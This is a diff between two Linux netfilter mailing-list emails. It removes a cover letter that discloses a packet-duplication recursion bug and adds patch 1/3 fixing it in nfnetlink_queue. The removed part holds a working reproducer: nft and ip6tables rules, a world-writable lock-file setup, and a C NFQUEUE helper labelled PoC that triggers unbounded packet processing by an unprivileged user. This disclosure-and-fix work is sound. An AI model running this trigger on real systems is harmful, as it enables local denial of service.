@@ -1,62 +1,64 @@
-Received: from mail-pj1-f53.google.com (mail-pj1-f53.google.com [209.85.216.53])
+Received: from mail-pg1-f175.google.com (mail-pg1-f175.google.com [209.85.215.175])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 3480C49E12B
-	for <netfilter-devel@vger.kernel.org>; Thu, 15 Oct 2026 07:45:01 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.216.53
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id F3A771C695
+	for <netfilter-devel@vger.kernel.org>; Thu, 15 Oct 2026 07:45:10 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.215.175
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1792050307; cv=none; b=NBb19COA/mmAA3rKgsQUKBtIOq2WEF206lBNgSU7Tr1uujxGWSNL9HI856kc3tfASxg2ZBw8jBssHDSRKH1BPpaqnC9rngqnwIx89jn6KazHmOKzLQTfu57t0ofdGqepuwPEBrai6Llw9uoLFfFcv0Ol65+GuCvqCFDwS0EdIis=
+	t=1792050317; cv=none; b=Am5Bw48BlzYubJU+apjittbjRfx6fvHL297VbK9/g+Bf6MRVtmQe5xQT9Yg2zz3ql8Lg79JKbXV6wbEfgxaEg4v/KqOUW/1tBaMeoh9DPDt9H18d/2177/aAg0PIY8d1L0TUkwkbN+52wB+Tz+B+fA72JmZmDDue4522SgtFIY0=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1792050307; c=relaxed/simple;
-	bh=idWN7cBcsaFBF247ym2WF7oMSLDflFPIND3hmNaYCa8=;
-	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=MOi42ueqQAwh+8DwfBmr46tDcShUiKUTk5EOSJ7HA0HLGa6KSC6qPknUvMBgZ00HeZyhVP7TmpvEGjn5qHis5fU7Ew20cfYIAWdd+Hfkr7Dw5FufYuPLgjjMWokEYrB58L0jH2fNfoSi+RsuHG86oPXDiKDDwKS+Ryteik5m29g=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=Iw50In6K; arc=none smtp.client-ip=209.85.216.53
+	s=arc-20240116; t=1792050317; c=relaxed/simple;
+	bh=yLyNM8HfGsASCEH5EQcPoGP7A0J7/o+NpVZh3itxuhw=;
+	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
+	 MIME-Version; b=fX9K3e/xb2eFY01aXz3+X0hGsADFOs+SGc6G7/+Rop3ao+OE+k+vMBqrypyjINXc/KYcdw1YbhXKUKSqlr5O5asnDiycuKpprSZDYUwPLnBKpwEC5K4elbe3WbKJpXGHq+vIIw3MaGt88012wbjUNlUzPrgD/eaNYqzfB7iReNw=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=nxgdiQrY; arc=none smtp.client-ip=209.85.215.175
 Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="Iw50In6K"
-Received: by mail-pj1-f53.google.com with SMTP id 98e67ed59e1d1-3ac6794fe45so1153339a91.0
-        for <netfilter-devel@vger.kernel.org>; Thu, 15 Oct 2026 00:45:01 -0700 (PDT)
+	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="nxgdiQrY"
+Received: by mail-pg1-f175.google.com with SMTP id 41be03b00d2f7-cc751eddf25so3033965a12.3
+        for <netfilter-devel@vger.kernel.org>; Thu, 15 Oct 2026 00:45:10 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=nebusec.ai; s=google; t=1792050301; x=1792655101; darn=vger.kernel.org;
-        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
-         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
-        bh=MB3RHjkAvRQ8BWBg48t/sxWYHpkyDjwBGTNUPuir1DU=;
-        b=Iw50In6KsDzaj3bgjCO/Sbfp/4agjgCWZL8y40cGa6FkHxFGvp3IG+xVewff1ORpd6
-         mvR+NGCETuYpG9Mvu6iJyX/DjFSU1wX/y67E2VL5WsA2/9irB5/ffZAR8L9nIX5RSoFS
-         TsNncW1UZKaR+E22cf1IGR6Du3N1SgRvnPxPPJoFgUZOGuDboOFCy/fVyBVwe+9Acspg
-         qOWboNZPhFFC59n8Z4VXUwPW1nqlhVsNhRvRQDD+HbivTIf/PfzTwQw9JojJDt6wpK/s
-         3PAl25viMYrQxLAPRZc+oQzGAItxOR/BT2LOgon8Z6FGZbzCzAYH4g6MXHxzVH1qJzMO
-         /DqQ==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20260707; t=1792050301; x=1792655101;
-        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
-         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+        d=nebusec.ai; s=google; t=1792050310; x=1792655110; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:references:in-reply-to
+         :message-id:date:subject:cc:to:from:from:to:cc:subject:date
          :message-id:reply-to:content-type;
-        bh=MB3RHjkAvRQ8BWBg48t/sxWYHpkyDjwBGTNUPuir1DU=;
-        b=uKyCLguAcu2yIr8hJJa6KsUCH5xksKOTaUzl5xeV7QJjkD6wgFzve1obrWsjTkOETZ
-         37JyyMLK2pCIPm+z5tNSeezqczb45P/dh76P3Yc93PGBuwUGjOImVI3I+zV0nCa5d6mq
-         WPu9GbLjISWWJsrzmASkPxfZNRCwbNS0prZjJAFl+y10ud9jPvxHkT7HEmRXXP4Q3oRl
-         qkD84OsA380rlF4ORLRgWPqlNMfI4VNphBHYZ2jPziyEYpXhPPP1hkUZiI9hk9H7UqHg
-         Y6VgOlafgpUHA6l8CxL2UkywoFMxvqOtu1W/zlfPP42uxwRshuJyt755y2s+0i4SMaWP
-         rSWw==
-X-Gm-Message-State: AFq9FYJfk2DS8QT2L5Zj1anHeQwAVW/2cN8lQ8WjRgurDNL7PzJPzlQk
-	/NKjQKSPHQTSc+7ipFcV5dZnFgKfijczrKGr/hlf/ike+1A0cUhHM15oBcdso6ipe11fMD2cONA
-	2WgOm2w==
-X-Gm-Gg: AYBFou3/NtrZ5JgdPO1Yx0sCqQau34WTze8aOKDFWFX7IZqjzTSZHUuDFzOvOo5h4SZ
-	U+/RFwEc5YqVq4NweOcl59OAzcz4rJiM4hL4aFoR5g8rcNJNhNBY7x0usW9041auYxaycEMUJbo
-	WIX74vKOWhgFABQsDL8PB7dZ8LjsOwJ+1PRIp0M1rjm0EHO8Xol3gg6KTpioPH5MRt5fA+BNstf
-	0PGssSdyE9n1wVx1qMH99BuywJ4l/6THbDZ3PHy7vnJ42d7NucbLsru1OfGVEJA/gYu4SuxeAaB
-	hVrCRO7oxol4sWek5cEvarL1+ktTF6y2snEWO/lLi9CXX5999fqV29rb2F2nVgkxnEi9mMd6O+x
-	pByQW9aDzBreUjT8SCICQB1wYgjkxI+a3TnNQetGMGjj2jcNgrHbxSFCZw9oU+nfSdVDSaYtADD
-	GIzF61cXtKbwW2YybaPQ97flxlzY8OiB2WGtq/QjVOsNV4xNCbRu3bdth+SxVkwAhTSCWDzKhy2
-	mgtn2uX1DF7ZMON+JQWOBJRbTb2MQ==
-X-Received: by 2002:a17:90b:4d0b:b0:3ab:1285:dfd6 with SMTP id 98e67ed59e1d1-3ac6f2952e2mr4157445a91.38.1792050300873;
-        Thu, 15 Oct 2026 00:45:00 -0700 (PDT)
+        bh=s18ZSAeaTj3uFCQOPUAhE8p5i1eeNicCpcv0Dn1C87s=;
+        b=nxgdiQrYBUhG4D4ivNCaDPGQEOqe9lOIBwqIXq39ZKbQwGqCjUgEzw0UYJxsn1h1we
+         XSn52ZZnykmrE+4QaH9RwlKmjYufprDnDLvqf+vmZdwwfo4cZTxmcpsAQrkydikZqhjU
+         4Q9ca/u5PmVYkQXYGAZgbo91nkJbTaEDglIVA0DZQEegyYNXHU5W3I5Qdcat2K7Ahr+s
+         /QvSTH53FG/KRu/H4FSf7e72xO+PlakMbdlyHkKSxDxFOEJ4aN6FRGGA/LhvjggVnMAq
+         HXQEfcEIfXYL2DR4LhME+ZSsKOW1NpY0kHew/h9AlRm+BXnrjE7qu3J9tnirRASdThXY
+         prKw==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20260707; t=1792050310; x=1792655110;
+        h=content-transfer-encoding:mime-version:references:in-reply-to
+         :message-id:date:subject:cc:to:from:x-gm-gg:x-gm-message-state:from
+         :to:cc:subject:date:message-id:reply-to:content-type;
+        bh=s18ZSAeaTj3uFCQOPUAhE8p5i1eeNicCpcv0Dn1C87s=;
+        b=YFMEv6sDAIvUDc3ZkRqYR5pwNoSeap/Sai7UbYsSs9Y5Hip0iPDbLTJp363azyXcN9
+         +fYKeghdlVXQBmeV1v2dd0KY23I+wev4Rya4CEuoUVQ6T/DfhcgBhp+C3lnVKk8itOLU
+         PhLuoQdtVIcq6LHHxTIdKFReeQT+14voDvfMr+qIMJKXaJxgLShdHF6fvpORCNkBN1No
+         mcgROyLtV1M8KyLrqKehSpR9J+Mbw9d0QBB44mINKpZ7Ifhk7igM2CS+xEUqjIJqa4QT
+         4dOeL0jKn9PuFr+8mV3OUbH/QBll6FPWACUeYUNzRTuP/RqzAUSwRW9qGPoTGyaq31eI
+         7SuQ==
+X-Gm-Message-State: AFq9FYI6j38vruilBmeAMhGYepIHl8TQ6jyYFg/z5Fr7Cbbpf63apl4L
+	mD0oC2sSjCse5R0VU2pQFGBPMBBgykH4p9edMcIMcbyVU1RN9P/GDBrGyOfwtnP7s8G9uyuu5Qd
+	AX0yoyG/sGtc=
+X-Gm-Gg: AYBFou0C8OmB4g3CGC4jqmjPIn1mp0LjQ2G/6jZq2nEd8Mp05p39Ix3lEqxbM2hq4Z+
+	tR6dwCW+eUsuQwqSht4IxO/ZYUJTmBr/aQhQFcAWFUKrPQrqIX/VEr1f0/sQO557ueeuR0X7SKR
+	/XHqNPkB0Gtf4kidShKE6dphlVv1GkYMw6oxxCqW9gfhzSHMF8DDe2B8STkt2yQjglPiCIZkeep
+	4BfwvtYmk01xBgzUX61756OVBAf0d0wnMWsO2jLcnbCf8Y5ZEXezMKr/wfAAMQm7xFYUVvTS9zz
+	nAtOqW7b4joh5/212n9rLy3MwOSj+AaQr5n/sEqxvsVoen/1XpHfUyllaa36XPr0GG+937QoeUd
+	X0OtHXGhIsI51Dvy+joSk802UYx+FYO0/GT6vy2uSIyzjFBt84PISLWmna8dMzGulY0agteRJhB
+	Lnl1a8Kjp8tpRDjrbOwiN7WTyuKh1vA3r2KLkf7eqS7W8U0i0VRQwlSL4r9L6CsxL1h4XolllWj
+	rbE+xvB+CqOrwMIcUsZR4Y1Pew2iQ==
+X-Received: by 2002:a17:90b:4d85:b0:3a4:c946:9f4e with SMTP id 98e67ed59e1d1-3ab3acdc386mr14478029a91.58.1792050309820;
+        Thu, 15 Oct 2026 00:45:09 -0700 (PDT)
 Received: from 24c857d0c3be.. ([122.51.212.64])
-        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3ac93849da5sm1636831a91.4.2026.10.15.00.44.50
+        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3ac93849da5sm1636831a91.4.2026.10.15.00.45.01
         (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Thu, 15 Oct 2026 00:44:59 -0700 (PDT)
+        Thu, 15 Oct 2026 00:45:08 -0700 (PDT)
 From: Zihan Xi <zihanx@nebusec.ai>
 To: netfilter-devel@vger.kernel.org,
 	virtualization@lists.linux.dev,
@@ -93,10 +95,12 @@ Cc: pablo@netfilter.org,
 	vega@nebusec.ai,
 	root@tr0jan.top,
 	zihanx@nebusec.ai
-Subject: [PATCH nf v8 0/3] netfilter: bound asynchronous packet duplication
-Date: Thu, 15 Oct 2026 07:43:06 +0000
-Message-ID: <cover.1792048855.git.zihanx@nebusec.ai>
+Subject: [PATCH nf v8 1/3] netfilter: nf_dup: preserve guard across NFQUEUE reinjection
+Date: Thu, 15 Oct 2026 07:43:07 +0000
+Message-ID: <1eca65f844ea4eaefa9ea4a852f1db27aacc10b9.1792048855.git.zihanx@nebusec.ai>
 X-Mailer: git-send-email 2.47.3
+In-Reply-To: <cover.1792048855.git.zihanx@nebusec.ai>
+References: <cover.1792048855.git.zihanx@nebusec.ai>
 Precedence: bulk
 X-Mailing-List: netfilter-devel@vger.kernel.org
 List-Id: <netfilter-devel.vger.kernel.org>
@@ -105,236 +109,109 @@ List-Unsubscribe: <mailto:netfilter-devel+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
 Content-Transfer-Encoding: 8bit
 
-Hi Linux kernel maintainers,
+NFQUEUE can suspend traversal of a duplicated packet while the task-local
+duplication guard is set. The output call then returns and clears the guard
+before a later verdict resumes hook traversal.
 
-We found and validated an issue in netfilter packet duplication. The bug
-is reachable by an unprivileged user in user and network namespaces.
-Bounded tests exercised the fixes. Non-duplication packet semantics are
-intended to remain unchanged. MIRRED flow offload for affected netdev dup
-rules is rejected because it cannot enforce the duplication-depth limit.
+Save the guard in the queue entry and restore it while reinjection continues
+hook traversal. Preserve and restore the verdict task's prior state, including
+nested synchronous reinjection.
 
-We will provide detailed information about the bug
-in this email, along with a PoC to trigger it.
-
----- details below ----
-
-Bug details:
-
-The IPv4 and IPv6 duplication helpers use a task-local guard while a cloned
-packet traverses output hooks. If NFQUEUE suspends that traversal, the
-output call can return and clear the guard before a later verdict resumes
-the remaining hooks. The resumed packet can reach another duplication
-consumer without the original guard. This can cause repeated packet
-processing and consume CPU and network resources. Patch 1 records the
-guard in the queue entry and restores it during reinjection. It keeps
-bottom halves disabled during the reinjection traversal, restoring the
-verdict task state before reenabling them.
-
-The netdev nft dup path has a separate synchronous transmit recursion
-counter. It does not accompany a duplicated skb through asynchronous
-software receive paths. Patch 2 carries a bounded duplication depth through
-skb and supported XDP conversions, resets it on reused buffers, and rejects
-MIRRED flow offload where the software depth cannot be enforced. This scope
-covers software skb/XDP continuity, not packet loops through physical
-hardware or userspace device round trips.
-
-At PRE_ROUTING and LOCAL_IN, the IPv4 and IPv6 helpers decrement TTL or
-hop limit on the copy. Patch 3 stops creating copies when the value is
-<= 1, so the decrement cannot reach zero or wrap a zero value to the
-maximum. The three patches address the NFQUEUE reinjection, software
-netdev receive, and ingress TTL/hop-limit paths, respectively. The patch
-does not intend to change packet semantics for unrelated traffic; it also
-rejects affected MIRRED flow offload because it cannot enforce the
-netdev duplication-depth limit.
-
-Validation:
-
-The v8 series was built on nf.git main at
-ab699d296e066eb64f51d2a8a1d42237a3b186c8 and booted in a 2-vCPU,
-2-GiB QEMU guest as 7.3.0-rc5-g9a13bdbfd108. In bounded user/network
-namespace runs, the IPv4 and IPv6 nft dup/NFQUEUE tests each completed
-three callbacks with three successful verdicts and no verdict failures.
-A separate IPv4 run sent three UDP datagrams and completed nine callbacks
-with nine successful verdicts; the nft counters showed nine visits at
-each configured dup rule. These are bounded validation runs.
-
-For netdev dup, a native veth/XDP_TX-to-XDP_PASS test reached the
-first four depth-coded rules once each and did not reach the next two.
-The XDP_PASS control test without the transmit loop reached its single
-dup rule four times. The IPv4 TTL test observed eight matching packets
-and no TTL-0 or TTL-255 packets. The filtered IPv6 test observed eight
-matching packets and no hop-limit-0 packets; its one hop-limit-255 count
-was unrelated NDP traffic and is not evidence for the dup path. An IPv6
-xt_TEE/NFQUEUE test ran in a non-initial user/network namespace: one UDP
-datagram produced two callbacks, both accepted successfully. The guest
-test setup used ip6tables-legacy and pre-created its xtables lock file
-with mode 0666 so the unprivileged test process could open the lock.
-
-An unpatched-baseline bounded run by an unprivileged user in user and
-network namespaces reached 1,018,782 NFQUEUE callbacks in 61.643
-seconds. The callback counter is incremented before nfq_set_verdict(),
-so this is a callback count, not a successful-verdict count. This
-observed repeated packet processing and resource consumption.
-
-Reproducer:
-
-    gcc -O2 -o nfq_accept poc.c -lnetfilter_queue
-    unshare -Urn /bin/bash
-
-The NFQUEUE trigger requires a userspace verdict process, while the netdev
-test installs XDP programs and exercises veth skb/XDP conversion. Those
-setup and verdict interactions are not expressible as a standalone
-packetdrill exchange. The reproducer below covers the NFQUEUE path; the
-separate bounded TTL/hop-limit and netdev/XDP validation results are
-summarized above.
-
-The following commands ran as an unprivileged user in a new user/network
-namespace. First create a veth pair and assign 198.18.0.1/24 to v0 and
-198.18.0.2/24 to v1, then bring both links up. Install these output hooks:
-
-    nft add table ip t
-    nft 'add chain ip t dup1 { type filter hook output priority raw; policy accept; }'
-    nft 'add chain ip t queue1 { type filter hook output priority mangle; policy accept; }'
-    nft 'add chain ip t dup2 { type filter hook output priority filter; policy accept; }'
-    nft add rule ip t dup1 udp dport 5555 counter dup to 198.18.0.2 device v0
-    nft add rule ip t queue1 udp dport 5555 queue num 0
-    nft add rule ip t dup2 udp dport 5555 counter dup to 198.18.0.2 device v0
-
-Start the verdict process in the background, send three UDP datagrams to
-198.18.0.2 port 5555, then wait for the helper to exit:
-
-    ./nfq_accept 1 4 &
-    q=$!
-    python3 -c 'import socket; s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); [s.sendto(b"x",("198.18.0.2",5555)) for _ in range(3)]'
-    wait "$q"
-
-The included helper returns NF_ACCEPT for each queued packet and reports
-callback and verdict counts.
-
-For the IPv6 xt_TEE test, the same helper was run in a non-initial
-user/network namespace after creating a veth pair with fd00::1/64 on v0
-and fd00::2/64 on v1. The guest test fixture pre-created
-/run/xtables.lock with mode 0666 as guest root:
-
-    touch /run/xtables.lock
-    chmod 0666 /run/xtables.lock
-
-The rules and one-packet trigger were:
-
-    ip6tables-legacy -t mangle -A OUTPUT -p udp -m udp --dport 5556 -j TEE --gateway fd00::2
-    ip6tables-legacy -t mangle -A OUTPUT -p udp -m udp --dport 5556 -j NFQUEUE --queue-num 0
-    ./nfq_accept 1 6 &
-    q=$!
-    python3 -c 'import socket; s=socket.socket(socket.AF_INET6,socket.SOCK_DGRAM); s.sendto(b"x",("fd00::2",5556))'
-    wait "$q"
-
-We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
-
-------BEGIN poc.c------
-
-#include <arpa/inet.h>
-#include <errno.h>
-#include <signal.h>
-#include <stdint.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <sys/time.h>
-#include <unistd.h>
-#define NF_ACCEPT 1
-#define NF_DROP 0
-#define NF_REPEAT 4
-#define NF_STOP 5
-#include <libnetfilter_queue/libnetfilter_queue.h>
-
-static volatile sig_atomic_t stop;
-static unsigned long callbacks, verdict_ok, verdict_fail, repeats, drops;
-static const char *mode = "accept";
-static struct nfq_q_handle *queue;
-static void alarm_handler(int sig) { (void)sig; stop = 1; }
-static int cb(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg,
-              struct nfq_data *nfa, void *data)
-{
-    (void)nfmsg; (void)data;
-    struct nfqnl_msg_packet_hdr *ph = nfq_get_msg_packet_hdr(nfa);
-    if (!ph) return 0;
-    uint32_t id = ntohl(ph->packet_id);
-    callbacks++;
-    if (!strcmp(mode, "slow")) usleep(100000);
-    uint32_t verdict = NF_ACCEPT;
-    if (!strcmp(mode, "repeat-first") && callbacks == 1) { verdict = NF_REPEAT; repeats++; }
-    else if (!strcmp(mode, "drop")) { verdict = NF_DROP; drops++; }
-    else if (!strcmp(mode, "stop")) verdict = NF_STOP;
-    int rv = nfq_set_verdict(qh, id, verdict, 0, NULL);
-    if (rv >= 0) verdict_ok++;
-    else verdict_fail++;
-    return 0;
-}
-int main(int argc, char **argv)
-{
-    int seconds = argc > 1 ? atoi(argv[1]) : 3;
-    signal(SIGALRM, alarm_handler); alarm(seconds);
-    int family = argc > 2 && atoi(argv[2]) == 6 ? AF_INET6 : AF_INET;
-    if (argc > 2 && atoi(argv[2]) == 7) family = 7;
-    if (argc > 3) mode = argv[3];
-    struct nfq_handle *h = nfq_open();
-    if (!h) { perror("nfq_open"); return 1; }
-    if (nfq_unbind_pf(h, family) < 0) perror("nfq_unbind_pf");
-    if (nfq_bind_pf(h, family) < 0) { perror("nfq_bind_pf"); return 2; }
-    queue = nfq_create_queue(h, 0, cb, NULL);
-    if (!queue) { perror("nfq_create_queue"); return 3; }
-    if (!strcmp(mode, "slow") && nfq_set_queue_maxlen(queue, 1) < 0) { perror("nfq_set_queue_maxlen"); return 4; }
-    if (nfq_set_mode(queue, NFQNL_COPY_PACKET, 0xffff) < 0) { perror("nfq_set_mode"); return 4; }
-    int fd = nfq_fd(h); char buf[65536];
-    while (!stop) {
-        int n = recv(fd, buf, sizeof(buf), MSG_DONTWAIT);
-        if (n >= 0) { nfq_handle_packet(h, buf, n); continue; }
-        if (errno == EAGAIN || errno == EWOULDBLOCK) { usleep(1000); continue; }
-        if (errno == EINTR) continue;
-        perror("recv"); break;
-    }
-    printf("callbacks=%lu verdict_ok=%lu verdict_fail=%lu repeat=%lu drop=%lu", callbacks, verdict_ok, verdict_fail, repeats, drops);
-    nfq_destroy_queue(queue); nfq_close(h);
-    return verdict_fail ? 5 : 0;
-}
-
-------END poc.c--------
-
-Changes in v8:
-  - split the v7 NFQUEUE/netdev proposal into focused patches and add a
-    third patch for the ingress TTL/hop-limit limit
-  - preserve the IPv4/IPv6 recursion guard across NFQUEUE reinjection
-  - bound netdev dup depth across software skb/XDP paths
-  - stop IPv4 TTL and IPv6 hop-limit underflow before cloning
-  - limit the netdev claim to software skb/XDP paths and document the
-    MIRRED offload restriction
-  - v7 Link:
-    https://lore.kernel.org/all/cover.1791688819.git.zihanx@nebusec.ai/
-
-Best regards,
-Zihan Xi
-
-Zihan Xi (3):
-  netfilter: nf_dup: preserve guard across NFQUEUE reinjection
-  netfilter: nf_dup_netdev: bound asynchronous duplication
-  netfilter: nf_dup: prevent TTL and hop-limit underflow
-
- drivers/net/veth.c               |  3 +++
- drivers/net/virtio_net.c         |  3 +++
- include/linux/skbuff.h           |  9 +++++++++
- include/net/libeth/xdp.h         |  6 ++++--
+Fixes: cd58bcd9787e ("netfilter: xt_TEE: have cloned packet travel through Xtables too")
+Cc: stable@vger.kernel.org
+Reported-by: Vega <vega@nebusec.ai>
+Assisted-by: LLM
+Co-developed-by: Luxing Yin <root@tr0jan.top>
+Signed-off-by: Luxing Yin <root@tr0jan.top>
+Signed-off-by: Zihan Xi <zihanx@nebusec.ai>
+---
  include/net/netfilter/nf_queue.h |  1 +
- include/net/xdp.h                | 25 +++++++++++++++++++++++++
- net/core/gro.c                   |  3 +++
- net/core/xdp.c                   | 10 ++++++++++
- net/ipv4/netfilter/nf_dup_ipv4.c |  3 +++
- net/ipv6/netfilter/nf_dup_ipv6.c |  3 +++
- net/netfilter/nf_dup_netdev.c    | 11 ++++++++++-
  net/netfilter/nf_queue.c         |  1 +
  net/netfilter/nfnetlink_queue.c  | 15 ++++++++++++---
- net/xdp/xsk_buff_pool.c          |  2 ++
- 14 files changed, 89 insertions(+), 6 deletions(-)
+ 3 files changed, 14 insertions(+), 3 deletions(-)
 
+diff --git a/include/net/netfilter/nf_queue.h b/include/net/netfilter/nf_queue.h
+index fc3e81c07364..039622d48905 100644
+--- a/include/net/netfilter/nf_queue.h
++++ b/include/net/netfilter/nf_queue.h
+@@ -23,6 +23,7 @@ struct nf_queue_entry {
+ 	struct net_device	*physout;
+ #endif
+ 	struct nf_hook_state	state;
++	bool			in_nf_duplicate;
+ 	bool			nf_ct_is_unconfirmed;
+ 	u16			size; /* sizeof(entry) + saved route keys */
+ 
+diff --git a/net/netfilter/nf_queue.c b/net/netfilter/nf_queue.c
+index 73363ceedebe..44f182eba953 100644
+--- a/net/netfilter/nf_queue.c
++++ b/net/netfilter/nf_queue.c
+@@ -219,6 +219,7 @@ static int __nf_queue(struct sk_buff *skb, const struct nf_hook_state *state,
+ 	*entry = (struct nf_queue_entry) {
+ 		.skb	= skb,
+ 		.skb_dev = skb->dev,
++		.in_nf_duplicate = current->in_nf_duplicate,
+ 		.state	= *state,
+ 		.hook_index = index,
+ 		.size	= sizeof(*entry) + route_key_size,
+diff --git a/net/netfilter/nfnetlink_queue.c b/net/netfilter/nfnetlink_queue.c
+index a3bc00280051..9a8f55498fd5 100644
+--- a/net/netfilter/nfnetlink_queue.c
++++ b/net/netfilter/nfnetlink_queue.c
+@@ -43,6 +43,7 @@
+ #include <net/sock.h>
+ #include <net/tcp_states.h>
+ #include <net/netfilter/nf_queue.h>
++#include <net/net_debug.h>
+ #include <net/netns/generic.h>
+ 
+ #include <linux/atomic.h>
+@@ -368,17 +369,24 @@ static void nf_reinject(struct nf_queue_entry *entry, unsigned int verdict)
+ 	unsigned int i;
+ 	int err;
+ 	u8 pf;
++	bool old_in_nf_duplicate;
++
++	DEBUG_NET_WARN_ONCE(current->in_nf_duplicate,
++			    "%s called with duplication guard set", __func__);
++	local_bh_disable();
++	old_in_nf_duplicate = current->in_nf_duplicate;
+ 
+ 	net = entry->state.net;
+ 	pf = entry->state.pf;
+ 
++	current->in_nf_duplicate = entry->in_nf_duplicate;
+ 	hooks = nf_hook_entries_head(net, pf, entry->state.hook);
+ 
+ 	i = entry->hook_index;
+ 	if (!hooks || i >= hooks->num_hook_entries) {
+ 		kfree_skb_reason(skb, SKB_DROP_REASON_NETFILTER_DROP);
+ 		nf_queue_entry_free(entry);
+-		return;
++		goto out;
+ 	}
+ 
+ 	hook_entry = &hooks->hooks[i];
+@@ -401,9 +409,7 @@ static void nf_reinject(struct nf_queue_entry *entry, unsigned int verdict)
+ 	switch (verdict & NF_VERDICT_MASK) {
+ 	case NF_ACCEPT:
+ 	case NF_STOP:
+-		local_bh_disable();
+ 		entry->state.okfn(entry->state.net, entry->state.sk, skb);
+-		local_bh_enable();
+ 		break;
+ 	case NF_QUEUE:
+ 		err = nf_queue(skb, &entry->state, i, verdict);
+@@ -417,6 +423,9 @@ static void nf_reinject(struct nf_queue_entry *entry, unsigned int verdict)
+ 	}
+ 
+ 	nf_queue_entry_free(entry);
++out:
++	current->in_nf_duplicate = old_in_nf_duplicate;
++	local_bh_enable();
+ }
+ 
+ /* return true if the entry has an unconfirmed conntrack attached that isn't owned by us
 -- 
 2.43.0
 
